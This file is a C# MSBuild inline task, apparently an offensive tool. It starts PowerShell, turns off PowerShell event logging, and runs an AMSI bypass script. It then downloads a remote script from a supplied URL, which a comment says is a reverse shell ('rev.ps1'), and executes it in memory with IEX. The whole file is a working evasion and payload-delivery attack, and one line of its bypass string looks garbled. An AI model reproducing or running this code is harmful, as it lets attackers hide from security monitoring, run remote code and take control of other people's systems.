using System;
using System.IO;
using System.Text;
using System.Reflection;
using Microsoft.CSharp;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Security.Cryptography;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;

public class ClassExample : Task, ITask
{
    [Required]
    public string PayloadUrl { get; set; }

    public override bool Execute()
    {
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();

        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;

        // --- AMSI bypass ---
        var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
        if (PSEtwLogProvider != null) {
            var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
            var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
            EtwProvider.SetValue(null, EventProvider);
        }
String cmdo = "$a = 'System.Management.Automation.A';$b = 'msiUtils';$c = [Ref].Assembly.GetType($a+$b);$d = $c.GetField('amsiInitFailed','NonPublic,Static');$d = $c.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');";
ps.AddScript(cmdo);
ps.Invoke();
        ps.Commands.Clear();

        // --- Fetch rev.ps1 via HTTP and run it in-memory dengan IEX ---
        string cmd = "iex (New-Object Net.WebClient).DownloadString('" + PayloadUrl + "')";
        ps.AddScript(cmd);
        ps.Invoke();

        rs.Close();
        return true;
    }
}
